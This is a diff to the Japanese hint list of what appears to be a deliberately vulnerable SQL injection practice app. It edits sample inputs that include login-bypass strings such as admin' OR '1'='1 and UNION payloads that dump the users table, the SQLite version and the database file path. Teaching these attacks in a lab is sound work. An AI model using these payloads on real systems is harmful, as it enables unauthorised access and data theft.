@@ -214,7 +214,6 @@
                     <li>通常のログイン: <code>admin</code> / <code>password123</code></li>
                     <li>パスワードを無視する: ユーザー名に <code>admin' OR '1'='1</code> を入力</li>
                     <li>コメントアウト: ユーザー名に <code>admin' --</code> を入力（パスワードはなんでもOK）</li>
-                    <li>すべてのユーザーでログイン: ユーザー名に <code>' OR '1'='1</code> を入力</li>
                 </ul>
             </div>
 
@@ -236,7 +235,8 @@
                     <li>通常の検索: <code>alice</code></li>
                     <li>すべてのユーザーを取得: <code>' OR '1'='1</code></li>
                     <li>UNION攻撃: <code>' UNION SELECT * FROM users --</code></li>
-                    <li>データベース名を取得: <code>' UNION SELECT sqlite_version(), NULL, NULL, NULL --</code></li>
+                    <li>SQliteのバージョンを取得: <code>' UNION SELECT sqlite_version(), NULL, NULL, NULL --</code></li>
+                    <li>データベース名を取得: <code>' UNION SELECT NULL, file, NULL, NULL, NULL FROM pragma_database_list WHERE name='main' -- </code></li>
                 </ul>
             </div>
 
